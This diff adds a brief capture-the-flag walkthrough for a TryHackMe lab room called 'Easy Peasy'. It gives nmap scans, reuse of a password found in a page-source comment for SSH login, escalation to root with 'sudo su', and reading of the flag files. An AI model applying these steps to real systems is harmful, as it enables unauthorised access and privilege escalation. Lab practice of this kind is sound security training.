@@ -1,0 +1,54 @@
+----------------                               ------------------
+               :::::::::::;| EASY PEASY |;::::::::::::
+
+1) FIRST WE HAVE TO ACCES THE TRYHACKME FROM OPENVPN.
+2) WE HAVE TO JOIN THE ROOM "EASY PEASY".
+ 
+TASK - 1 (RECON)
+
+1. SCAN THE MACHNE.
+
+    namp -Pn <ip>
+    nmap -A -T 5 <ip> -vv
+
+"it's a Linux machine".
+
+2. How many ports are open?
+ANS: 2 ports (22/SSH, 80/HTTP)
+
+3. What's on port 80?
+ANS: Simple website with "Easy Peasy" title.
+
+----------TASK 1 COMPLETED----------
+
+TASK - 2 (WEB EXPLOIT)
+
+1. CHECK SOURCE CODE.
+
+    view-source:http://<ip>
+    "Found comment: <!-- pwd: easy123 -->"
+
+2. LOGIN TO SSH.
+
+    ssh easy@<ip>
+    Password: easy123
+    "WE'RE IN AS EASY!"
+
+----------TASK 2 COMPLETED-----------
+ 
+TASK - 3 (PRIV ESC)
+
+1. CHECK SUDO.
+
+    sudo -l
+    "Can run ALL commands as root!"
+    sudo su
+    "BOOM! ROOT!"
+
+FLAGS:
+    cat /root/root.txt
+    cat /home/easy/user.txt
+
+-------------------                                                --------------------
+             -----------                                    ------------
+                  ---------- EASY PEASY OWNED ----------
